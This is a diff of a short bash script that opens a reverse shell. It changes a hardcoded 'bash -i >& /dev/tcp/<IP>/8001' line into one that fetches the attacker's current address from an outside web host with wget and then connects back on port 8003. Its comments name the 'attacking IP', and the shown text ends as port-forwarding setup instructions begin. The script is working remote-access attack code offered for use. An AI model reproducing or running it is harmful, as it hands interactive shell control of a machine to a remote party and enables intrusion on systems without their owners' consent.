@@ -1,9 +1,14 @@
 #!/bin/bash
 
-# ip=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)
-# bash -i >& /dev/tcp/youripaddress/8001 0>&1
+# Define the port which will be open to receive the connection on the attacking IP
+port=8003
 
-bash -i >& /dev/tcp/148.3.88.17/8001 0>&1
+# Get the attacking current IP
+ip=$(wget -qO- http://eudomus.webfactional.com/currentip/)
+echo $ip >> currentip.log
+
+# Open a reverse tunnel
+bash -i >& /dev/tcp/$ip/$port 0>&1
 
 # INSTRUCTIONS:
 # 1. Open port 8001-8079 on your router and forward it to your device's local IP on the same port
